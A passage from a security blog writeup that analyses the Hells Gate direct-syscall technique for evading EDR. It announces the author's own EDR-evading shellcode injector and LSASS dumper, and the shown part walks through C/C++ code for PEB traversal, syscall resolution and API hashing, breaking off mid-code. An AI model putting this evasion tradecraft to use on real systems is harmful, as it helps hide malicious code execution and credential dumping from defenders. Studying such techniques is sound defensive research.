        >
      
    
  </div>

</div>
  </div>
</div>

      

      

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
    

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          <p>The following writeup is a my analysis of the <a href="https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf" target="_blank"><em>Hells Gate</em></a> malware. This malware strain contains a technique that performs syscalls on the Windows operating system in order to evade EDR detection.</p>
<p>Upon completion of my analysis, I developed my own implementation in C++ that uses existing syscall instructions within <em>ntdll.dll</em> and a custom hashing technique to evade the modern methods of detection for these types of techniques.</p>
<p>There are further optimizations that can be added to the technique, however for the sake of time, two PoC&rsquo;s were developed.</p>
<ol>
<li>In the year 2024, a basic shellcode injector that evades modern EDR</li>
<li>In 2024 an LSSAS dumper that evades Windows Defender.</li>
</ol>
<p>The LSASS dumper may be optimized to evade EDR however I leave this as an exercise to the reader.</p>


<h1 class="relative group">Table of Contents 
    <div id="table-of-contents" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#table-of-contents" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li><a href="#disclaimer">Disclaimer</a></li>
<li><a href="#understanding-the-malware">Understanding The Malware</a>
<ul>
<li><a href="#get-ntdll-module-entry">Get NTDLL Module Entry</a></li>
<li><a href="#getting-the-export-address-table-eat-of-ntdll">Getting the Export Address Table (EAT) of NTDLL</a></li>
<li><a href="#understanding-getvxtableentry">Understanding GetVxTableEntry()</a></li>
<li><a href="#understanding-payload">Understanding Payload()</a></li>
<li><a href="#understanding-hellsgate">Understanding HellsGate</a></li>
<li><a href="#understanding-hellsdescent">Understanding HellsDescent</a></li>
</ul>
</li>
<li><a href="#poc--gtfo-ezekiels-wheel">PoC | GTFO (Ezekiels Wheel)</a></li>
<li><a href="#sources">Sources</a></li>
</ul>


<h1 class="relative group">Disclaimer 
    <div id="disclaimer" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#disclaimer" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>Copyright 2024 Milton Valencia</p>
<p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p>
<p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p>
<p>THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>


<h1 class="relative group">Understanding The Malware 
    <div id="understanding-the-malware" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#understanding-the-malware" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>So I downloaded the source code for this technique from <a href="https://github.com/am0nsec/HellsGate" target="_blank">am0nsec</a>. I wanted to break down this code line-by-line starting with the main function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">INT</span> <span class="nf">wmain</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">PTEB</span> <span class="n">pCurrentTeb</span> <span class="o">=</span> <span class="nf">RtlGetThreadEnvironmentBlock</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">PPEB</span> <span class="n">pCurrentPeb</span> <span class="o">=</span> <span class="n">pCurrentTeb</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pCurrentPeb</span> <span class="o">||</span> <span class="o">!</span><span class="n">pCurrentTeb</span> <span class="o">||</span> <span class="n">pCurrentPeb</span><span class="o">-&gt;</span><span class="n">OSMajorVersion</span> <span class="o">!=</span> <span class="mh">0xA</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Get NTDLL module 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="n">pLdrDataEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLDR_DATA_TABLE_ENTRY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pCurrentPeb</span><span class="o">-&gt;</span><span class="n">LoaderData</span><span class="o">-&gt;</span><span class="n">InMemoryOrderModuleList</span><span class="p">.</span><span class="n">Flink</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Get the EAT of NTDLL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pImageExportDirectory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetImageExportDirectory</span><span class="p">(</span><span class="n">pLdrDataEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pImageExportDirectory</span><span class="p">)</span> <span class="o">||</span> <span class="n">pImageExportDirectory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mh">0x01</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">VX_TABLE</span> <span class="n">Table</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="n">Table</span><span class="p">.</span><span class="n">NtAllocateVirtualMemory</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0xf5bd373480a6b89b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pLdrDataEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Table</span><span class="p">.</span><span class="n">NtAllocateVirtualMemory</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Table</span><span class="p">.</span><span class="n">NtCreateThreadEx</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0x64dc7db288c5015f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pLdrDataEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Table</span><span class="p">.</span><span class="n">NtCreateThreadEx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Table</span><span class="p">.</span><span class="n">NtProtectVirtualMemory</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0x858bcb1046fb6a37</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pLdrDataEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Table</span><span class="p">.</span><span class="n">NtProtectVirtualMemory</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Table</span><span class="p">.</span><span class="n">NtWaitForSingleObject</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0xc6a2fa174e551bcb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pLdrDataEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Table</span><span class="p">.</span><span class="n">NtWaitForSingleObject</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">Payload</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Table</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>So it looks like the first step is to &ldquo;Get NTDLL&rdquo;.</p>


<h2 class="relative group">Get NTDLL Module Entry 
    <div id="get-ntdll-module-entry" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#get-ntdll-module-entry" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>To get a better understanding of how this was achieved I used the following PoC:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTEB</span> <span class="n">pTeb</span> <span class="o">=</span> <span class="nf">GetThreadEnvironmentBlock</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">PPEB</span> <span class="n">pPeb</span> <span class="o">=</span> <span class="n">pTeb</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[*] Testing on OS Version: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">pPeb</span><span class="o">-&gt;</span><span class="n">OSMajorVersion</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="n">pLdrDataEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLDR_DATA_TABLE_ENTRY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pPEB</span><span class="o">-&gt;</span><span class="n">LoaderData</span><span class="o">-&gt;</span><span class="n">InMemoryOrderModuleList</span><span class="p">.</span><span class="n">Flink</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[*] pLdrDataEntry: 0x&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">pLdrDataEntry</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>For the sake of brevity structures will only be brought up when relevant. Once ran, we see the following output but what is this?</p>
<pre tabindex="0"><code>C:\Users\developer\Desktop&gt;hg.exe 
[*] Testing on OS Version: 10
[*] pLdrDataEntry: 0x26f94d06020
</code></pre><p>If we break into WinDbg, we can get to the <code>PEB</code> using <code>!process 0 0 hg.exe</code>. The main thing we want to look at here is the <code>InMemoryOrderModuleList</code>.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/process.png" alt="alt text" />
      
    </figure>
</p>
<p>We can see that this is very similar to our output and if we subtract <strong>0x10</strong> from this address it&rsquo;s exactly the same.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/dump.png" alt="alt text" />
      
    </figure>
</p>
<p>At first glance, this does not tell us much. However, each list entry is actually wrapped in a <code>LDR_DATA_TABLE_ENTRY</code>. So, we can get more context by dumping the structure itself located in the <code>FLINK</code> pointer.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/ntdll.png" alt="alt text" />
      
    </figure>
</p>
<p>In the output above we can see that this is in fact the entry to the NTDLL module. The steps are basically as follows in this line of code:</p>
<ol>
<li>Use the GS register to get a pointer to the TEB</li>
<li>The TEB contains a pointer to the PEB</li>
<li>Use the PEB to get a pointer to the PEB_LDR_DATA structure</li>
<li>Using the PEB_LDR_DATA structure we can get to the InMemoryOrderModuleList</li>
</ol>
<p>Let&rsquo;s implement a PoC to traverse this using doubly-linked list using our new found knowledge. Since we have no guarantee that <code>ntdll.dll</code> will always be loaded at offset <code>-0x10</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTEB</span> <span class="n">pTeb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PPEB</span> <span class="n">pPeb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PLIST_ENTRY</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PLIST_ENTRY</span> <span class="n">pHeadEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PPEB_LDR_DATA</span> <span class="n">pLdrData</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="n">pLdrEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="n">pLdrDataTableEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Get the TEB */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pTeb</span> <span class="o">=</span> <span class="nf">GetThreadEnvironmentBlock</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Get the PEB */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pPeb</span> <span class="o">=</span> <span class="n">pTeb</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* OS Version Detection Omitted */</span>
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[*] Testing on OS Version: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">pPeb</span><span class="o">-&gt;</span><span class="n">OSMajorVersion</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Obtain a pointer to the structure that contains information about the loaded modules for a given process */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pLdrData</span> <span class="o">=</span> <span class="n">pPeb</span><span class="o">-&gt;</span><span class="n">LoaderData</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Get the pointer to the InMemoryOrderModuleList which is a doubly-linked list that contains
</span></span></span><span class="line"><span class="cl"><span class="cm">       the loaded modules for the process */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pHeadEntry</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pLdrData</span><span class="o">-&gt;</span><span class="n">InMemoryOrderModuleList</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Iterate over the InMemoryOrderModuleList */</span>
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">InMemoryOrderModuleList</span><span class="se">\n</span><span class="s">&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">Base</span><span class="se">\t\t\t</span><span class="s">Module</span><span class="se">\n</span><span class="s">&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">pEntry</span> <span class="o">=</span> <span class="n">pHeadEntry</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span> <span class="n">pEntry</span> <span class="o">!=</span> <span class="n">pHeadEntry</span><span class="p">;</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pLdrDataTableEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLDR_DATA_TABLE_ENTRY</span><span class="p">)</span><span class="n">pEntry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">          <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">pLdrDataTableEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span> <span class="o">&lt;&lt;</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">          <span class="o">&lt;&lt;</span> <span class="n">pLdrDataTableEntry</span><span class="o">-&gt;</span><span class="n">FullDllName</span><span class="p">.</span><span class="n">Buffer</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Nice we can see that our PoC works:</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/traversing_linked_list.png" alt="alt text" />
      
    </figure>
</p>
<p>However, we still need to get it to return the original value from the PoC which is a pointer to the LIST_ENTRY. So, let&rsquo;s modify our code once more, creating a single function to obtain the entry dynamically.</p>
<p>When writing this I observed that the last PoC (we wrote) was incorrect for properly parsing each entry. To properly reach an LDR_DATA_TABLE_ENTRY, we must subtract 0x10 from the module found since the Flink address IS NOT the first member of the structure.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="nf">GetNtdllTableEntry</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTEB</span> <span class="n">pTeb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PPEB</span> <span class="n">pPeb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">dwModuleHash</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">dwDllNameSize</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">dwRorOperations</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PLIST_ENTRY</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PLIST_ENTRY</span> <span class="n">pHeadEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PPEB_LDR_DATA</span> <span class="n">pLdrData</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="n">pLdrEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="n">pLdrDataTableEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Get the TEB */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pTeb</span> <span class="o">=</span> <span class="nf">GetThreadEnvironmentBlock</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Get the PEB */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pPeb</span> <span class="o">=</span> <span class="n">pTeb</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Obtain a pointer to the structure that contains information about the loaded modules for a given process */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pLdrData</span> <span class="o">=</span> <span class="n">pPeb</span><span class="o">-&gt;</span><span class="n">LoaderData</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Get the pointer to the InMemoryOrderModuleList which is a doubly-linked list that contains
</span></span></span><span class="line"><span class="cl"><span class="cm">       the loaded modules for the process */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pHeadEntry</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pLdrData</span><span class="o">-&gt;</span><span class="n">InMemoryOrderModuleList</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Iterate over the InMemoryOrderModuleList and identify NTDLL */</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">pEntry</span> <span class="o">=</span> <span class="n">pHeadEntry</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span> <span class="n">pEntry</span> <span class="o">!=</span> <span class="n">pHeadEntry</span><span class="p">;</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* If I understood correctly we must subtract 16 from the ntdll.dll entry in the InMemoryModuleList. This
</span></span></span><span class="line"><span class="cl"><span class="cm">           is neccessary because the Flink is not the first member of the LDR_DATA_TABLE_ENTRY structure, so when
</span></span></span><span class="line"><span class="cl"><span class="cm">           subtracting 0x10 we get the start of the structure for ntdll.dll */</span>
</span></span><span class="line"><span class="cl">        <span class="n">pLdrDataTableEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLDR_DATA_TABLE_ENTRY</span><span class="p">)((</span><span class="n">std</span><span class="o">::</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">pEntry</span><span class="o">-</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* Calculate a hash for the given DLL name */</span>
</span></span><span class="line"><span class="cl">        <span class="n">dwDllNameSize</span> <span class="o">=</span> <span class="p">(</span><span class="n">pLdrDataTableEntry</span><span class="o">-&gt;</span><span class="n">BaseDllName</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">dwRorOperations</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">dwModuleHash</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* Hash the DLL name for identification */</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwDllNameSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">dwModuleHash</span> <span class="o">=</span> <span class="n">dwModuleHash</span> <span class="o">+</span> <span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">pLdrDataTableEntry</span><span class="o">-&gt;</span><span class="n">BaseDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">dwRorOperations</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">dwDllNameSize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">dwModuleHash</span> <span class="o">=</span> <span class="nf">_rotr</span><span class="p">(</span><span class="n">dwModuleHash</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">dwRorOperations</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;[*] Found %ws (HASH: 0x%lx, ENTRY: 0x%lx)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pLdrDataTableEntry</span><span class="o">-&gt;</span><span class="n">BaseDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span>
